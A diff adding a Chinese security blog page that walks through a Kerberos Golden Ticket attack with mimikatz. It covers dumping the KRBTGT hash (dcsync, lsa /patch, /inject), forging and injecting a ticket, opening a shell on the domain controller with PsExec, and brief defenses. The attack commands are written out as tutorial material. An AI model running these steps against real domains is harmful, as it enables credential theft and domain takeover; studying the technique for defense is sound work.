@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-157457995-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+      
+  黄金票据与mimikatz &ndash; Arefu&#39;s Zone
+
+    </title>
+    
+    
+    <meta name="description" property="og:description" content="后渗透的一些隐匿手段。
+|blog under go1f.cc">
+    
+
+    <meta name="apple-mobile-web-app-title" content="Arefu&#39;s Zone">
+    
+    
+    <link rel="icon" href="/favicon-64.png">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="mask-icon" size="any" href="/pinned-icon.svg">
+    
+    
+    
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@">
+    <meta name="twitter:title" content="黄金票据与mimikatz | Arefu&#39;s Zone">
+    <meta name="twitter:description" content="后渗透的一些隐匿手段。|blog under go1f.cc">
+    <meta name="twitter:image" content="https://blog.go1f.cc/twitter-card.png">
+    
+
+
+    <link rel="stylesheet" href="/assets/syntax.css">
+    <link rel="stylesheet" href="/assets/primer-build.css">
+    <link rel="stylesheet" href="/assets/style.css">
+  </head>
+
+
+  <body class="bg-gray">
+    <div id="holy" class="container-lg bg-white h-100">
+
+      <div id="header" class="px-1 bg-white">
+        <nav class="UnderlineNav UnderlineNav--right px-2">
+  <a class="UnderlineNav-actions muted-link h2" href="https://blog.go1f.cc/">
+    Arefu&#39;s Zone
+  </a>
+
+  
+  
+  <div class="UnderlineNav-body">
+    
+    
+    
+    <a class="UnderlineNav-item " href="/">
+      
+      <span>公告栏</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/notes/">
+      
+      <span>笔记</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/blog/">
+      
+      <span>博客</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/about/">
+      
+      <span>一份简历</span>
+    </a>
+    
+    
+  </div>
+  
+</nav>
+
+      </div>
+
+      <div role="main" id="main" class="holy-main markdown-body px-4 bg-white">
+        
+
+<div class="Subhead">
+  <div class="Subhead-heading">
+    <div class="h1 mt-3 mb-1">黄金票据与mimikatz</div>
+  </div>
+  <div class="Subhead-description">
+    
+
+
+<a href='/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F' class="muted-link">
+  <span class="Label Label--gray-darker">内网渗透</span>
+</a>
+
+
+
+<a href='/tags/hash' class="muted-link">
+  <span class="Label Label--gray">hash</span>
+</a>
+
+<a href='/tags/mimikatz' class="muted-link">
+  <span class="Label Label--gray">mimikatz</span>
+</a>
+
+
+
+    
+    <div class="float-md-right">
+      <span title="Lastmod: 2020-02-12. Published at: 2020-02-12.">
+        
+          Lastmod: 2020-02-12
+        
+      </span>
+    </div>
+    
+  </div>
+</div>
+<article>
+  
+  <section class="pb-6 mb-3 border-bottom">
+    <p>后渗透的一些隐匿手段。</p>
+<h2 id="条件">条件</h2>
+<ul>
+<li>域名称</li>
+<li>域的SID值</li>
+<li>域账户 KRBTGT 的 NTLM-HASH/AES128/AES256</li>
+<li>伪造的任意账户名</li>
+</ul>
+<p>​</p>
+<h2 id="流程">流程</h2>
+<p><strong>第一步</strong></p>
+<p>任意加入域的本地管理员、或域控管理员身份运行 mimikatz</p>
+<p>法一</p>
+<pre><code>lsadump::dcsync /domain:safe.com /user:krbtgt
+</code></pre><p><img src="https://i.loli.net/2020/02/12/GvXCczoA3FraDMb.jpg" alt="krbtgt-hash.jpg"></p>
+<p>​</p>
+<p>法二</p>
+<pre><code>lsadump::lsa /patch
+</code></pre><p><img src="https://i.loli.net/2020/02/12/DC9q27Yo43H8lvL.jpg" alt="lsadump_lss_patch.jpg"></p>
+<p>​</p>
+<p>法三</p>
+<pre><code>lsadump::lsa /inject /name:krbtgt
+</code></pre><p><img src="https://i.loli.net/2020/02/12/Ari6uG3vytYb2l9.jpg" alt="lsadump_lsa_inject_name_krbtgt.jpg"></p>
+<p>ps：在命令行图形界面，复制时易崩溃，顶栏右键属性，勾选快速编辑模式。或者在meterpreter下运行mimikatz。</p>
+<p>​</p>
+<p><strong>第二步</strong></p>
+<p>使用mimikatz的kerberos模块，伪造“ddos”用户票据</p>
+<pre><code>kerberos::golden /domain:safe.com /user:ddos /sid:S-1-5-21-547193061-1956947868-3691761807 /krbtgt:54987be05306522e830214ef201213fc /file:test.ticket
+</code></pre><blockquote>
+<p><code>/domain</code>   - FQDN：the fully qualified domain name (eg: <code>chocolate.local</code>)</p>
+<p><code>/sid</code>     - 域名SID (例如: <code>S-1-5-21-130452501-2365100805-3685010670</code>)</p>
+<p><code>/user</code>    - 任意用户名</p>
+<p><code>/id</code>    - 可选，默认500(管理员)</p>
+<p><code>/groups </code>    - 可选默认: <code>513,512,520,518,519</code> (管理员用户组)</p>
+<p>三选一参数：</p>
+<blockquote>
+<p><code>/rc4</code> or <code>/krbtgt</code>     - the <code>NTLM</code> hash</p>
+<p><code>/aes128</code>    - the AES128 key</p>
+<p><code>/aes256</code>    - the AES256 key</p>
+</blockquote>
+<p><code>/ticket</code>     - 可选，指定输出票据文件名</p>
+<p><code>/ptt</code>     - 不输出文件，直接导入票据，无需先清理本地票据</p>
+</blockquote>
+<p>​</p>
+<p><strong>第三步</strong></p>
+<p>导入票据</p>
+<pre><code>kerberos::list    #查看当前用户票据
+kerberos::purge    #清理本地票据票据
+kerberos::ptt test.ticket    #pass-the-ticket 导入伪造票据
+kerberos::list    #检查票据，观察client name
+</code></pre><p>票据20分钟内有效，过期之后可以再次导入</p>
+<p>​</p>
+<p><strong>第四步</strong></p>
+<p>执行连接或请求需要kerberos认证的服务，譬如，<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">psexec</a></p>
+<pre><code>PsExec64.exe \\DC1 cmd.exe    #DC1为safe.com的域控
+</code></pre><p><img src="https://i.loli.net/2020/02/12/IdU6mfF3g8Xj2LJ.jpg" alt="伪造管理员域用户.jpg"></p>
+<p>​</p>
+<h2 id="排错">排错</h2>
+<ol>
+<li>法一获取SID，注意不要复制UID</li>
+</ol>
+<p><img src="https://i.loli.net/2020/02/12/GvXCczoA3FraDMb.jpg" alt="krbtgt-hash.jpg"></p>
+<ol start="2">
+<li>
+<p>运行mimikaz伪造票据不需要管理员权限，普通域用户即可。</p>
+</li>
+<li>
+<p>注意登录在域用户下运行，非本地用户。</p>
+</li>
+<li>
+<p>第四步时不要使用IP访问，认为系统默认走NTLM认证，而票据是用于Kerberos认证的。</p>
+<blockquote>
+<p>NTLM在以下场景仍然使用：</p>
+<ul>
+<li>客户端使用IP地址向服务器认证</li>
+<li>客户端向一个未加入域的服务器认证</li>
+<li>未使用活动目录的场景（通常指工作组或对等网络）</li>
+<li>防火墙策略限制了Kerberos使用的端口（通常为TCP 88 端口）</li>
+</ul>
+</blockquote>
+</li>
+</ol>
+<p>​    5. mimikatz在win2003及以下系统在导入黄金票据时报错</p>
+<p>​</p>
+<h2 id="防御">防御</h2>
+<ol>
+<li>限制管理员登录到除域控制器和少数管理服务器以外的计算机</li>
+<li>定期更改KRBTGT密码</li>
+<li>连续更改两次密码，使任何现有的黄金票据失效。</li>
+</ol>
+<p>​</p>
+<h2 id="指南">指南</h2>
+<p><strong><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos">module ~ kerberos</a></strong></p>
+<p><strong><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump">module ~ lsadump</a></strong></p>
+  </section>
+
+  <section>
+    
+      <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "go1f" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    
+  </section>
+</article>
+
+      </div>
+
+      <div id="side" class="pr-1 bg-white">
+        <aside class="pr-3">
+          
+  
+    <div id="toc" class="Box Box--blue mb-3">
+      <b>黄金票据与mimikatz</b><nav id="TableOfContents">
+  <ul>
+    <li><a href="#条件">条件</a></li>
+    <li><a href="#流程">流程</a></li>
+    <li><a href="#排错">排错</a></li>
+    <li><a href="#防御">防御</a></li>
+    <li><a href="#指南">指南</a></li>
+  </ul>
+</nav></div>
+  
+
+  
+    
+    
+      <div>
+        
+
+        
+
+        
+
+        
+          <a data-pocket-label="pocket" data-pocket-count="none" class="pocket-btn" data-lang="en"></a>
+          <script type="text/javascript">!function(d,i){if(!d.getElementById(i)){var j=d.createElement("script");j.id=i;j.src="https://widgets.getpocket.com/v1/j/btn.js?v=1";var w=d.getElementById(i);d.body.appendChild(j);}}(document,"pocket-btn-js");</script>
+        
+
+      </div>
+    
+  
+
+        </aside>
+      </div>
+
+      <div id="footer" class="pt-2 pb-3 bg-white text-center">
+        
+
+  <span class="text-small text-gray">
+    ©go1f 2020 &middot; 
+
+    Powered by the
+    <a href="https://github.com/qqhann/hugo-primer" class="link-gray-dark">Hugo-Primer</a> theme for
+    <a href="https://gohugo.io" class="link-gray-dark">Hugo</a>.
+  </span>
+
+
+      </div>
+    </div>
+
+    
+  </body>
+</html>
